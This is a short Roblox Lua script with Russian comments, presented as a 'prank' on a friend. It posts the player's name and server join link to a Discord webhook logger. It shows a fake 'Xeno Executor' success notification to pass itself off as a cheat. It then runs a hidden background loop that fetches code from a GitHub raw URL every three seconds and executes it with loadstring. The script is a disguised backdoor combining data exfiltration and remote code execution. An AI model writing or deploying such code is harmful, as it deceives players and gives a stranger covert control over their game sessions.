local httpRequest = (syn and syn.request) or (http and http.request) or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- 1. Ссылка на ваш логгер в Discord
local discordWebhook = "https://discord.com"
local uriJoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId

local payload = {["content"] = "🎯 **Пранк запущен!**\n👤 **Ник друга:** " .. player.Name .. "\n```" .. uriJoinLink .. "```"}
if httpRequest then
    httpRequest({Url = discordWebhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
end

-- Маскировка под запуск чита
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Xeno Executor", Text = "Script Loaded Successfully!", Duration = 3})
end)

-- 2. ССЫЛКА НА ВАШ ФАЙЛ КОМАНД (Вставьте сюда вашу RAW ссылку на command.lua)
local commandUrl = "https://githubusercontent.com"

local lastCommandCode = ""

-- Бесконечный цикл, который проверяет команды в фоне
task.spawn(function()
    while task.wait(3) do
        local success, currentCode = pcall(function()
            return game:HttpGet(commandUrl)
        end)
        
        -- Если код на гитхабе изменился и он не пустой — выполняем его!
        if success and currentCode and currentCode ~= "" and currentCode ~= lastCommandCode then
            lastCommandCode = currentCode
            local runCode = loadstring(currentCode)
            if runCode then
                pcall(runCode)
            end
        end
    end
end)
